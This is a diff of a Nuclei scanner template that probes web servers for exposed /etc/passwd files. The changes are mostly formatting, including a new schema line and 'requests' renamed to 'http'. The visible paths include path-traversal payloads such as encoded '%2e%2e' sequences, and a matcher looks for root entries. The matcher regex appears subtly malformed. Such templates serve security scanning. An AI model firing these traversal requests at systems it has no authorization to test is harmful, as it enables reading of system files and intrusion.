@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Etc-file
 
 
@@ -7,13 +8,13 @@ info:
   author: Saimon
   severity: high
   description: Finds etc password files
-  
 
- 
 
-requests:
+
+
+http:
   - method: GET
-    
+
     path:
     -  |
           -  "{{BaseURL}}swd"
@@ -96,15 +97,15 @@ requests:
           -  "{{BaseURL}}passwd"
           -  "{{BaseURL}}e\/etc/passwd"
           -  "{{BaseURL}}e\%2e%2e\/etc/passwd"
-      
+
     matcher-condition: and
     matchers:
       - type: status
         status:
           - 200
       - type: regex
-        regex: 
+        regex:
           - "root:[x*] :0:0"
           - "\\[(font|extension|file)s\\]"
-        
+
         part: body
